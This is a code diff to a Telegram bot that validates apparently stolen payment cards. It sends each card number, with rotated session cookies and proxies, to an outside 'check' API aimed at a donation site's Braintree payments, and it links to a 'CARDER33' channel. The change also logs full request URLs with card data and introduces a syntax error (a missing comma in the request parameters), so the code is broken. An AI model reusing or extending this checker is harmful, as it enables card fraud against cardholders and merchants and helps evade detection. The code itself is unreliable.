@@ -4373,16 +4373,17 @@ async def get_next_proxy():
         proxy_index = (proxy_index + 1) % len(PROXIES_LIST)
         parts = proxy_str.split(":")
         if len(parts) == 4:
-            host, port, user, password = parts
-            return f"http://{user}:{password}@{host}:{port}"
+            user, password, host, port = parts  # reorder parsing
+            return f"{user}:{password}@{host}:{port}"
         elif len(parts) == 2:
             host, port = parts
-            return f"http://{host}:{port}"
+            return f"{host}:{port}"
         else:
             raise ValueError(f"Invalid proxy format: {proxy_str}")
 
+
 logger = logging.getLogger(__name__)
-BASE_COOLDOWN = 20  # Base cooldown in seconds
+BASE_COOLDOWN = 10  # Base cooldown in seconds
 API_URL = "https://autob3cook.onrender.com/check?"
 API_KEY = "Xcracker911"
 SITE = "https://iditarod.com"
@@ -4499,46 +4500,50 @@ async def b3(update: Update, context):
     asyncio.create_task(run_braintree_check(user, cc_input, full_card, processing_msg))
 
 # --- Background Task: Cookie + Proxy rotation integrated ---
+# --- Background Task: Cookie + Proxy rotation integrated ---
 async def run_braintree_check(user, cc_input, full_card, processing_msg):
     BULLET_GROUP_LINK = "https://t.me/CARDER33"
     bullet_link = f'<a href="{BULLET_GROUP_LINK}">[⌇]</a>'
 
-    # --- Prepare API request ---
+    # --- Rotate cookie + proxy first ---
+    cookie_value = get_next_cookie()
+    proxy_url = await get_next_proxy()
+
+    # --- Prepare API request params ---
     params = {
         "key": API_KEY,
         "site": SITE,
-        "cookies": get_next_cookie(),  # rotate cookie
+        "cookies": cookie_value,
         "cc": cc_input
+        "proxy": proxy_url
     }
+
+    # --- Build & log full API request with proxy ---
+    from urllib.parse import urlencode
+    query_string = urlencode(params)
+    full_api_url = f"{API_URL}{query_string}&proxy={proxy_url}"
+    logger.info(f"[FULL API REQUEST] {full_api_url}")
+    print(f"[FULL API REQUEST] {full_api_url}")  # also prints to console
 
     try:
         timeout = aiohttp.ClientTimeout(total=50)
         async with aiohttp.ClientSession(timeout=timeout) as session:
-            proxy_url = await get_next_proxy()  # rotate proxy
-            logger.info(f"[DEBUG] Using proxy: {proxy_url}")
-            try:
-                async with session.get(API_URL, params=params, proxy=proxy_url) as resp:
-                    if resp.status != 200:
-                        await processing_msg.edit_text(
-                            f"❌ API returned HTTP {resp.status} via proxy {proxy_url}",
-                            parse_mode=ParseMode.HTML
-                        )
-                        return
-                    try:
-                        data = await resp.json(content_type=None)
-                    except Exception:
-                        text = await resp.text()
-                        await processing_msg.edit_text(
-                            f"❌ Failed parsing API response:\n<code>{escape(text)}</code>\nProxy: {proxy_url}",
-                            parse_mode=ParseMode.HTML
-                        )
-                        return
-            except Exception as e:
-                await processing_msg.edit_text(
-                    f"❌ Request error:\n<code>{escape(str(e))}</code>\nProxy: {proxy_url}",
-                    parse_mode=ParseMode.HTML
-                )
-                return
+            async with session.get(API_URL, params=params, proxy=proxy_url) as resp:
+                if resp.status != 200:
+                    await processing_msg.edit_text(
+                        f"❌ API returned HTTP {resp.status} via proxy {proxy_url}",
+                        parse_mode=ParseMode.HTML
+                    )
+                    return
+                try:
+                    data = await resp.json(content_type=None)
+                except Exception:
+                    text = await resp.text()
+                    await processing_msg.edit_text(
+                        f"❌ Failed parsing API response:\n<code>{escape(text)}</code>\nProxy: {proxy_url}",
+                        parse_mode=ParseMode.HTML
+                    )
+                    return
     except asyncio.TimeoutError:
         await processing_msg.edit_text(
             "❌ Request timed out after 50 seconds.",
@@ -4551,6 +4556,7 @@ async def run_braintree_check(user, cc_input, full_card, processing_msg):
             parse_mode=ParseMode.HTML
         )
         return
+
 
     # --- API response ---
     cc = data.get("cc", cc_input)
